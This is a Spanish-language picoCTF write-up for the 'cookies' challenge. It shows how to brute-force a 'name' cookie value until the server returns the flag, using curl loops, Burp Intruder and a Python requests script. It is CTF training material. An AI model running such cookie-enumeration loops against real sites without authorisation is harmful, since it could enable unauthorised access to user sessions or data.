# cookies

## Descripción

Who doesn't love cookies? Try to figure out the best one.
http://wily-courier.picoctf.net:51271/

Reto basado en la manipulación de cookies: el servidor cambia su respuesta según el valor de una cookie concreta (`name`). La bandera ya fue encontrada; aquí se documentan las distintas opciones (métodos) que se pueden usar para reproducir la solución.

## Opciones de solución

- **Navegador (editor de cookies)**: Instalar una extensión para editar cookies (ej.: "EditThisCookie" o el editor integrado en DevTools). Cambiar el valor de la cookie `name` por distintos números y recargar la página hasta que aparezca la bandera en la respuesta.

- **`curl` (línea de comandos)**: enviar peticiones con la cabecera `Cookie`. Ejemplos:

```bash
# Petición puntual
curl -s http://wily-courier.picoctf.net:58858/check -H "Cookie: name=3"

# Búsqueda automatizada sobre un rango de valores
for i in {1..30}; do
  curl -s http://wily-courier.picoctf.net:58858/check -H "Cookie: name=$i"
done | grep -i pico
```

- **Burp Suite (intercept + Repeater/Intruder)**: interceptar la petición que solicita la cookie, enviarla a *Repeater* y modificar manualmente el valor de `Cookie: name=...`. Para automatizar el barrido, lanzar la petición a *Intruder* y usar una lista de payloads con los números probados.

- **Script Python (requests)**: usar la librería `requests` para iterar valores y detectar la respuesta que contiene la bandera.

```python
import requests
import re

url = 'http://wily-courier.picoctf.net:58858/check'
for i in range(1,31):
    r = requests.get(url, cookies={'name': str(i)})
    if 'picoCTF{' in r.text:
        print(re.search(r"picoCTF\{.*?\}", r.text).group(0))
        break
```

- **Herramientas de automatización (xargs/parallel)**: si desea velocidad, generar la lista de cookies y mapear `curl` en paralelo con `xargs -P` o `parallel`.

## Notas

- Probar primero con la URL y puerto indicados en la descripción (`/check` suele ser la ruta en este reto). Ajuste el host/puerto si se indica otro.
- Comenzar con un rango razonable (p. ej. 1..30). Si no aparece, ampliar el rango o inspeccionar la lógica cliente/servidor con Burp.
- Evitar peticiones masivas que puedan parecer abuso; para CTF local/educativo esto suele estar bien en pequeñas cantidades.

## Referencias

- `curl` manual: https://curl.se/docs/
- `requests` (Python): https://docs.python-requests.org/
- Burp Suite: https://portswigger.net/burp
